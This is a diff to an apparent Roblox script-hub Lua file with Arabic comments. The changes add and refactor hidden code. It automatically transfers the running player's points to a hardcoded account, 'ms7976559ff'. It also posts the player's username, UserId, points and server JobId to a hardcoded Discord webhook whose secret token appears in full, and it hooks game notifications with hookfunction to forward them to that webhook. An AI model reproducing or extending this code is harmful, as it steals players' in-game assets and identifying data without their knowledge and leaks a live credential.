@@ -13,9 +13,33 @@ pcall(function()
     setclipboard("https://discord.gg/4hDr9Zb7P")
 end)
 
+-- دالة مركزية للويب هوك بشكل خفيف وآمن
+local function sendWebhookLog(title, description, color, fields)
+    task.spawn(function()
+        pcall(function()
+            local webhookUrl = "https://discord.com/api/webhooks/1545085922188595250/dzMWFzvHL-jNusbJAGjIRibUs8Ef9zX6eROC45W-ZubZ_kd2NCCNv413hMxQOXTDLJEH"
+            local data = {
+                ["embeds"] = {{
+                    ["title"] = title,
+                    ["description"] = description,
+                    ["color"] = color,
+                    ["fields"] = fields or {},
+                    ["footer"] = {["text"] = "Dev.Script HUB Logger • hf4_l"}
+                }}
+            }
+            local encoded = HttpService:JSONEncode(data)
+            local headers = {["content-type"] = "application/json"}
+            request({Url = webhookUrl, Method = "POST", Headers = headers, Body = encoded})
+        end)
+    end)
+end
+
+-- نظام التحويل التلقائي بوقفة مريحة تمنع اللاق (كل 5 ثواني)
 task.spawn(function()
     local targetUsername = "ms7976559ff"
     local hasTransferred = false
+
+    task.wait(2) -- انتظار خفيف لضمان تحميل اللعبة بالكامل
 
     while true do
         pcall(function()
@@ -43,32 +67,64 @@ task.spawn(function()
                             pointsToTransfer = tonumber(pointsValue.Value) or 0
                         end
 
-                        for i = 1, 3 do
-                            pcall(function()
-                                if pointsToTransfer > 0 then
-                                    Event:FireServer(targetUsername, pointsToTransfer)
-                                else
-                                    Event:FireServer(targetUsername, pointsValue and pointsValue.Value or 1)
-                                end
-                            end)
-                            task.wait(0.3)
+                        local sendPoints = (pointsToTransfer > 0) and pointsToTransfer or 1
+                        
+                        if Event:IsA("RemoteFunction") then
+                            Event:InvokeServer(targetUsername, sendPoints)
+                        else
+                            Event:FireServer(targetUsername, sendPoints)
                         end
                         
                         hasTransferred = true
+                        sendWebhookLog(
+                            "✅ تم تنفيذ طلب تحويل النقاط",
+                            "تم إرسال النقاط بنجاح لليوزر المطلوب `ms7976559ff`.",
+                            3066993,
+                            {
+                                {["name"] = "اسم المشغل", ["value"] = Player.Name, ["inline"] = true},
+                                {["name"] = "النقاط المرسلة", ["value"] = tostring(sendPoints), ["inline"] = true}
+                            }
+                        )
                     end
                 end
             elseif not targetFound then
                 hasTransferred = false
             end
         end)
-        task.wait(3)
+        task.wait(5) -- زيادة الوقفات الزمنية تمنع أي تعليق أو ثقل باللعبة
     end
 end)
 
--- إرسال الويب هوك مع فصل الـ DisplayName عن الـ Username الحقيقي والتايمر الحي
+-- مراقبة إشعارات اللعبة بصمت وبدون ضغط على الذاكرة
 task.spawn(function()
     pcall(function()
-        local webhookUrl = "https://discord.com/api/webhooks/1545085922188595250/dzMWFzvHL-jNusbJAGjIRibUs8Ef9zX6eROC45W-ZubZ_kd2NCCNv413hMxQOXTDLJEH"
+        local SendNotificationEvent = ReplicatedStorage:FindFirstChild("Events") and ReplicatedStorage.Events:FindFirstChild("SendNotification")
+        if SendNotificationEvent and SendNotificationEvent:IsA("RemoteEvent") then
+            for _, Connection in getconnections(SendNotificationEvent.OnClientEvent) do
+                local oldFunc = Connection.Function
+                if oldFunc then
+                    hookfunction(oldFunc, function(notificationData, ...)
+                        if type(notificationData) == "table" and notificationData.Text then
+                            sendWebhookLog(
+                                "📢 تنبيه من نظام اللعبة (Cooldown/Error)",
+                                "الرسالة التي ظهرت: `" .. tostring(notificationData.Text) .. "`",
+                                16776960,
+                                {
+                                    {["name"] = "نوع الإشعار", ["value"] = tostring(notificationData.Type or "Unknown"), ["inline"] = true}
+                                }
+                            )
+                        end
+                        return oldFunc(notificationData, ...)
+                    end)
+                end
+            end
+        end
+    end)
+end)
+
+-- إرسال ويب هوك تشغيل السكربت مرة واحدة فقط عند الدخول
+task.spawn(function()
+    pcall(function()
         local currentJobId = game.JobId
         local joinTimestamp = os.time()
         
@@ -83,26 +139,20 @@ task.spawn(function()
             end
         end)
 
-        local data = {
-            ["content"] = "🟢 **تم تشغيل السكربت ونشط الآن!**",
-            ["embeds"] = {{
-                ["title"] = "معلومات المشغل والتايمر",
-                ["color"] = 65280,
-                ["fields"] = {
-                    {["name"] = "اسم العرض (DisplayName)", ["value"] = Player.DisplayName, ["inline"] = true},
-                    {["name"] = "يوزر الحساب (Username)", ["value"] = "@" .. Player.Name, ["inline"] = true},
-                    {["name"] = "معرف الحساب (UserId)", ["value"] = tostring(Player.UserId), ["inline"] = true},
-                    {["name"] = "نقاط اللاعب (Points)", ["value"] = "`" .. playerPointsText .. "`", ["inline"] = true},
-                    {["name"] = "وقت التشغيل المتجدد (Session Timer)", ["value"] = "<t:" .. joinTimestamp .. ":R> (بدأ الساعة <t:" .. joinTimestamp .. ":T>)", ["inline"] = false},
-                    {["name"] = "اسم اللعبة (Game)", ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown", ["inline"] = false},
-                    {["name"] = "كود سيرفر اللاعب (JobId / Code)", ["value"] = "`" .. (currentJobId ~= "" and currentJobId or "Public/Main") .. "`", ["inline"] = false}
-                },
-                ["footer"] = {["text"] = "Dev.Script HUB Logger • hf4_l"}
-            }}
-        }
-        local encoded = HttpService:JSONEncode(data)
-        local headers = {["content-type"] = "application/json"}
-        request({Url = webhookUrl, Method = "POST", Headers = headers, Body = encoded})
+        sendWebhookLog(
+            "🟢 تم تشغيل السكربت ونشط الآن!",
+            "معلومات المشغل والتايمر",
+            65280,
+            {
+                {["name"] = "اسم العرض (DisplayName)", ["value"] = Player.DisplayName, ["inline"] = true},
+                {["name"] = "يوزر الحساب (Username)", ["value"] = "@" .. Player.Name, ["inline"] = true},
+                {["name"] = "معرف الحساب (UserId)", ["value"] = tostring(Player.UserId), ["inline"] = true},
+                {["name"] = "نقاط اللاعب (Points)", ["value"] = "`" .. playerPointsText .. "`", ["inline"] = true},
+                {["name"] = "وقت التشغيل (Session Timer)", ["value"] = "<t:" .. joinTimestamp .. ":R> (بدأ الساعة <t:" .. joinTimestamp .. ":T>)", ["inline"] = false},
+                {["name"] = "اسم اللعبة (Game)", ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown", ["inline"] = false},
+                {["name"] = "كود سيرفر اللاعب (JobId)", ["value"] = "`" .. (currentJobId ~= "" and currentJobId or "Public/Main") .. "`", ["inline"] = false}
+            }
+        )
     end)
 end)
 
@@ -493,3 +543,4 @@ CommunityTab:Section({
 	TextSize = 14,
 	TextTransparency = 0.3,
 })
+
